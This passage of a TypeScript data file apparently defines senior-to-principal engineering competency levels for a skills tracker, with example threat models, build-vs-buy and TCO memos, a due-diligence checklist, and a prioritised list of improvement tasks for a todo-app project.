| 2 | Attacker intercepts token in transit | ID | HTTPS only | ⚠️ No HSTS yet |
| 3 | SQL injection via email field | T | Parameterized queries | ✅ Done |
| 4 | Stolen refresh token replayed | S | Token rotation + reuse detection | ✅ Done |
| 5 | JWT secret committed to Git | ID | .gitignore + env vars | ✅ Done |
| 6 | DB superuser connection exploited | EoP | Least-privilege role | ❌ Not done |
| 7 | Auth logs insufficient for audit | R | Structured logging + req IDs | ❌ Not done |

## Priority Actions
1. Add HSTS via helmet() — 30 min
2. Create todo_app_user DB role — 1 hour
3. Add audit log for auth events — 2 hours`,
            language: "bash",
          },
        ],
        keywords: [
          "STRIDE",
          "threat model",
          "zero-trust",
          "security champion",
          "SOC 2",
          "ISO 27001",
          "BCP",
          "incident response",
          "security posture",
        ],
        applicationNote:
          "Requires written artifacts. Reference: foresight-2's 4-tier supply-chain security in .npmrc is Staff-level security thinking.",
        projectRefs: [
          {
            project: "foresight-2",
            label: ".npmrc 4-tier supply-chain defense",
            path: "repo/foresight-cloud-bms/.npmrc",
            note: "min-release-age=7, ignore-scripts=true, no secrets, no nested overrides — systematic supply-chain threat model applied",
          },
        ],
        gaps: [
          "Write a threat model (STRIDE) for todo-app auth flows.",
          "Write an incident response playbook for the async middleware bug class.",
        ],
      },
    ],
  },
  {
    id: 6,
    slug: "principal-consultant",
    title: "Level 6",
    subtitle: "Principal / Consultant",
    experience: "10+ years",
    overallStatus: "🔴 Not Met",
    statusColor: "red",
    selfCheck:
      "You can produce a credible technical due diligence report on an unfamiliar codebase within 48 hours, including architecture assessment, risk register, build-vs-buy analysis, and a summary recommendation with confidence levels. You can articulate the strategic rationale for every major technical decision in a production system you've led.",
    domains: [
      {
        name: "Frontend",
        status: "not-met",
        requirements: [
          {
            text: "Cross-organization standards: defining opinionated stacks and justifying them to CPO/CTO.",
            answer:
              "Principal level: your recommendation becomes policy. You must frame technical choices in business terms — not 'React is better than Angular' but 'standardizing on React reduces hiring friction by X and allows component sharing across 3 product lines, saving ~N eng-months/year'. ROI framing is mandatory.",
            code: `# Build-vs-Buy memo: Design System for todo-app

## Decision Required
Should we build a custom component library or adopt Radix UI + shadcn/ui?

## Analysis

### Build custom:
Cost: ~3 months for 2 engineers = 6 eng-months
Benefit: perfect brand control
Risk: maintenance burden, accessibility debt, no community

### Adopt shadcn/ui (Radix UI base):
Cost: ~1 week integration = 0.25 eng-months
Benefit: WCAG 2.1 AA out of the box, 40+ components,
         active community, copy-paste model (we own the code)
Risk: opinionated Tailwind dependency

## Recommendation
Adopt shadcn/ui. 24x faster to ship. Accessibility solved day 1.
Customize tokens (colors, fonts) to match brand — Tailwind config.
Revisit if we have specific interactive patterns shadcn can't cover.

ROI: 5.75 saved eng-months redirected to product features.`,
            language: "bash",
          },
        ],
        keywords: [
          "build vs buy",
          "ROI analysis",
          "rewrite vs refactor",
          "org-level standards",
          "CTO advisory",
        ],
        applicationNote:
          "Requires consulting artifacts. Reference: Foresight dual-stack migration analysis.",
        projectRefs: [
          {
            project: "foresight-2",
            label: "doc/technical-due-diligence-report.md",
            path: "doc/technical-due-diligence-report.md",
            note: "Full technical due diligence report on Foresight platform — reference structure and depth required at Level 6",
          },
        ],
        gaps: ["Write a build-vs-buy memo for a design system decision."],
      },
      {
        name: "Backend",
        status: "not-met",
        requirements: [
          {
            text: "Technical due diligence: assessing codebases for M&A or investment decisions.",
            answer:
              "Due diligence is a structured risk assessment. You have 48 hours, no IDE, no running app — just the repo. Priority: architecture coherence, security posture, test coverage, dependency health, bus-factor, documentation vs code alignment.",
            code: `# Technical Due Diligence Checklist

## Architecture (30 min)
[ ] Does the code match the architecture diagram?
    (Foresight: TimescaleDB in prod, docs said Cassandra)
[ ] Are domain boundaries clear or is it a distributed monolith?
[ ] Is there a federation/gateway or direct service coupling?

## Security (30 min)
[ ] npm audit / pip audit output
[ ] Secrets in Git? (git log --all -S 'SECRET' --oneline)
[ ] Auth model: JWT rotation? Rate limiting? CORS configured?
[ ] DB: superuser in prod? RLS policies?

## Reliability (20 min)
[ ] Test coverage %? CI runs tests or just builds?
[ ] HEALTHCHECK + liveness probes?
[ ] Error handling: unhandled rejections?

## Bus-Factor Risk (20 min)
[ ] Private deps unbuildable without credentials?
    (Foresight: foresight-go-middleware on private Bitbucket)
[ ] Key-person dependencies in commit history?
[ ] Runbooks / on-call documentation?

## Deliverable: Risk Register
| Risk | Severity | Probability | Mitigation |
|------|----------|-------------|------------|`,
            language: "bash",
          },
          {
            text: "Build-vs-buy analysis: buy commodity, build differentiators.",
            answer:
              "The principle: never build what you can buy for a commodity problem. Identity management (auth/SSO) is commodity — Keycloak or Auth0. Time-series DB is commodity — TimescaleDB or InfluxDB. But your semantic graph + AI classifier that understands building ontology? That's your moat — build it.",
            code: `# Build-vs-Buy: Auth for todo-app

## Current: Custom JWT implementation
Code: ~500 lines in auth.service.ts, jwt.ts, refreshToken.repository.ts
Capabilities: email/password, JWT rotation, rate limiting
Missing: SSO/OAuth, MFA, magic links, enterprise SAML
Maintenance: team must patch CVEs, handle token rotation edge cases

## Option A: Keep custom
Cost: $0/month, full control
Risk: Missing MFA = compliance blocker for enterprise customers
Verdict: viable for consumer app, not for B2B

## Option B: Keycloak (self-hosted)
Cost: ~$50/month infra + 1 week setup
Capabilities: SSO, MFA, SAML, OIDC, social login, audit logs
Risk: Ops burden (upgrades, HA setup)
Verdict: correct for B2B with enterprise customers

## Option C: Auth0 / Clerk
Cost: ~$300/month at scale
Capabilities: same as Keycloak + managed
Verdict: fastest time-to-market, but vendor lock-in risk

## Recommendation: Keycloak
Piscada made this exact choice — Keycloak + oauth2-proxy.
Auth is commodity. The todo-app team's value is in the todo features,
not in re-implementing OIDC.`,
            language: "bash",
          },
        ],
        keywords: [
          "technical due diligence",
          "build vs buy",
          "risk register",
          "vendor lock-in",
          "bus factor",
          "architecture roadmap",
          "Series A",
          "M&A",
          "strategic pivot",
        ],
        applicationNote:
          "Foresight-2 provides authentic consulting case study material: Series A pitch deck vs live code discrepancies, Keycloak (buy) vs custom JWT (build) decision, Anthropic lock-in risk, private Go module bus-factor.",
        projectRefs: [
          {
            project: "foresight-2",
            label: "Keycloak (buy) vs custom JWT (build) — auth decision",
            path: "repo/foresight-cloud",
            note: "Piscada chose Keycloak + oauth2-proxy over custom JWT. Principle: buy commodity (auth), build differentiators (semantic graph, AI classifier)",
          },
          {
            project: "foresight-2",
            label: "Anthropic vendor lock-in risk",
            path: "repo/foresight-classifier",
            note: "claude-sonnet-4-6/claude-opus-4-6 hardcoded — no LLM abstraction layer. Low probability, high impact risk register item.",
          },
          {
            project: "foresight-2",
            label: "Private Go module bus-factor",
            path: "repo/building-analytics-engine",
            note: "foresight-go-middleware: private Bitbucket dependency — unbuildable without credentials. Key-person/access-revocation risk.",
          },
          {
            project: "foresight-2",
            label: "doc/technical-due-diligence-report.md",
            path: "doc/technical-due-diligence-report.md",
            note: "Full authentic due diligence report including risk register and strategic recommendations",
          },
        ],
        gaps: [
          "Write a simulated technical due diligence report for todo-app as if evaluating it for a Series A investment.",
          "Write a build-vs-buy decision memo for adding auth to todo-app (custom JWT vs Keycloak vs Auth0).",
        ],
      },
      {
        name: "DevOps",
        status: "not-met",
        requirements: [
          {
            text: "Infrastructure cost modeling and FinOps practices.",
            answer:
              "TCO analysis: compare self-hosted vs managed for each component. Include: infra cost, eng time to maintain, incident cost, licensing. Foresight: GKE is expensive but eliminates 2-3 eng-months/year of K8s ops. TimescaleDB self-hosted is cheaper than managed but requires DBA attention.",
            code: `# TCO: Docker Compose → Managed Kubernetes (todo-app)

## Current state: Docker Compose on a single VPS
Infra:    $40/month (DigitalOcean Droplet)
Eng ops:  ~2 hours/month (manual deploys, updates)
SLO:      ~99.5% (single point of failure)
Scale:    max ~500 concurrent users before degradation

## Option: Google Kubernetes Engine (GKE Autopilot)
Infra:    ~$150/month (autopilot, 2 vCPU, 4GB RAM)
Eng ops:  ~4 hours setup, ~1 hour/month after
SLO:      99.9% (multi-node, auto-restart)
Scale:    HPA to 10x with no config changes

## Break-even
Extra cost: $110/month
Eng time saved: ~1 hour/month × $150/hour = $150 saved
Net: +$40/month benefit + resilience improvement

## Recommendation
Migrate at 1000+ MAU. Before that: single VPS + daily backups
is sufficient and saves $110/month for a pre-revenue product.`,
            language: "bash",
          },
        ],
        keywords: [
          "FinOps",
          "TCO",
          "multi-region",
          "DR",
          "RTO/RPO",
          "platform-as-product",
          "DX metrics",
          "managed vs self-hosted",
        ],
        applicationNote:
          "Requires consulting artifacts. Reference: Foresight GKE vs managed DB vs self-hosted TimescaleDB tradeoffs.",
        projectRefs: [
          {
            project: "foresight-2",
            label: "doc/Platform Architecture and TechStack.md",
            path: "doc/Platform Architecture and TechStack.md",
            note: "Architecture docs vs actual K8s manifests — documentation drift lesson: always verify against IaC, not static docs",
          },
        ],
        gaps: [
          "Write a TCO analysis for moving todo-app from Docker Compose to managed Kubernetes.",
        ],
      },
      {
        name: "Security",
        status: "not-met",
        requirements: [
          {
            text: "Security due diligence: assessing security posture for investment or partnership.",
            answer:
              "Security due diligence is a subset of technical due diligence. Focus on: secrets management, dependency CVEs, auth model, compliance exposure, and what a breach would cost. Express findings as business risk (revenue impact, regulatory fines) not just technical debt.",
            code: `# Security Due Diligence Report Excerpt
# todo-app — Series A Assessment

## Critical Findings

### 1. Database Superuser Access (HIGH)
todo-app connects as postgres/postgres superuser.
In the event of SQL injection or credential leak:
  - Attacker can DROP all tables
  - Attacker can exfiltrate all user data
  - GDPR Art. 33: must notify regulator within 72 hours
Remediation: Create restricted app role (1 hour)
Residual risk after fix: LOW

### 2. No Dependabot (MEDIUM)
3 known vulnerabilities in npm audit:
  - brace-expansion (ReDoS): moderate severity
  - @apollo/server: high severity
No automated tracking or alerting.
Remediation: Enable GitHub Dependabot (30 min)

### 3. Missing Security Headers (MEDIUM)
No helmet() — missing HSTS, CSP, X-Frame-Options.
Clickjacking and some XSS vectors unmitigated.
Remediation: Add helmet() (30 min)

## Risk Summary
Estimated cost of breach (GDPR fine 4% revenue + reputational):
At $1M ARR: up to $40,000 fine + customer churn
Recommendation: Address criticals before Series A close.`,
            language: "bash",
          },
        ],
        keywords: [
          "security due diligence",
          "GDPR",
          "NIS2",
          "compliance",
          "cyber insurance",
          "risk quantification",
          "security roadmap",
        ],
        applicationNote:
          "Requires consulting artifacts. Reference: Foresight customer data handling and Norwegian regulatory context.",
        projectRefs: [
          {
            project: "foresight-2",
            label: "Foresight customer data + GDPR context",
            path: "doc",
            note: "766 enterprise customers, 1,500 buildings — GDPR/NIS2 exposure analysis for Series A due diligence",
          },
        ],
        gaps: [
          "Write a 12-month security roadmap for todo-app prioritizing by risk/cost ratio.",
        ],
      },
    ],
  },
];

export const GAP_ITEMS: GapItem[] = [
  {
    priority: 1,
    title: "Automated Tests",
    description:
      "be-node-express currently lacks tests (package.json has no test script). Start with: unit tests for services/auth.service.ts (mocking repositories), integration tests using supertest covering /api/auth/* and /api/todos (using isolated test databases or per-test transaction rollbacks).",
    status: "todo",
    project: ["todo-app"],
  },
  {
    priority: 2,
    title: "Versioned Database Migrations",
    description:
      "Currently uses a single db/init.sql script via Docker entrypoint. Add node-pg-migrate or Prisma to provide up/down migrations reviewable via PRs like standard application code.",
    status: "todo",
    project: ["todo-app"],
  },
  {
    priority: 3,
    title: "Caching Layer (Redis)",
    description:
      "/api/todos/stats is a prime candidate for Redis caching by userId, invalidated whenever todo items mutate within associated categories.",
    status: "todo",
    project: ["todo-app"],
  },
  {
    priority: 4,
    title: "Structured Logging (pino)",
    description:
      "Replace console.log/console.error with structured JSON logging (pino), introducing unique request IDs to trace requests through logs.",
    status: "todo",
    project: ["todo-app"],
  },
  {
    priority: 5,
    title: "CI Upgrades",
    description:
      ".github/workflows/ci.yml currently only executes build + Docker image checks. Missing: tsc --noEmit, test runs, linting steps, node_modules caching (actions/cache).",
    status: "todo",
    project: ["todo-app"],
  },
  {
    priority: 6,
    title: "Frontend Auth Integration",
    description:
      "fe-vite/fe-nextjs fetch /api/todos without authentication headers; after enforcing JWT they cannot communicate via UI. Implement login interface + token persistence (React Query + memory tokens / httpOnly refresh cookies).",
    status: "todo",
    project: ["todo-app"],
  },
  {
    priority: 7,
    title: "Senior / Staff / Consultant Artifacts",
    description:
      "Author 3 documents: (1) postmortem for the authenticateSession unhandled async error bug, (2) RFC detailing architectural failure points at 10M users, (3) simulated technical due diligence report.",
    status: "todo",
    project: ["todo-app", "foresight-mini", "foresight-2"],
  },
  {
    priority: 8,
    title: "Security Headers (helmet)",
    description:
      "Add helmet() to src/app.ts — CSP, HSTS, X-Frame-Options. <30 minutes, high security impact.",
    status: "todo",
    project: ["todo-app"],
  },
  {
    priority: 9,
    title: "Remediate npm audit Findings",
    description:
      "be-node-express reports 3 transitive vulnerabilities (@apollo/server, brace-expansion, uuid at moderate/high severity). Add Dependabot/Renovate for automated CVE tracking.",
    status: "todo",
    project: ["todo-app"],
  },
  {
    priority: 10,
    title: "Least-Privilege Database Role",
    description:
      "Application currently connects using postgres/postgres superuser credentials. Create a dedicated app role restricted to SELECT/INSERT/UPDATE/DELETE on target tables only.",
    status: "todo",
    project: ["todo-app"],
  },
  {
    priority: 11,
    title: "HEALTHCHECK in Dockerfile",
    description:
      "The /health endpoint exists in src/app.ts, but be-node-express/Dockerfile lacks a HEALTHCHECK directive. Add it for container orchestrator integration.",
    status: "todo",
    project: ["todo-app"],
  },
];

export const TRACK_SUMMARIES: TrackSummary[] = [
  {
    track: "Backend",
    estimatedLevel: "Middle (early Senior)",
    notes:
      "Layered architecture, 2 auth patterns, real SQL — lack of test suites is main barrier to Senior",
    status: "partial",
  },
  {
    track: "Frontend",
    estimatedLevel: "Junior",
    notes:
      "fe-vite/fe-nextjs remain at original baseline, falling behind refactored BE capabilities",
    status: "not-met",
  },
  {
    track: "DevOps",
    estimatedLevel: "Junior (early Middle)",
    notes:
      "Good multi-stage Docker + dev/prod compose setups, but CI lacks linting/testing and HEALTHCHECK",
    status: "partial",
  },
  {
    track: "Security",
    estimatedLevel: "Middle",
    notes:
      "Hashing/JWT/rate-limiting proper, but lacks security headers, vulnerability scanning, least-privilege DB role",
    status: "met",
  },
];
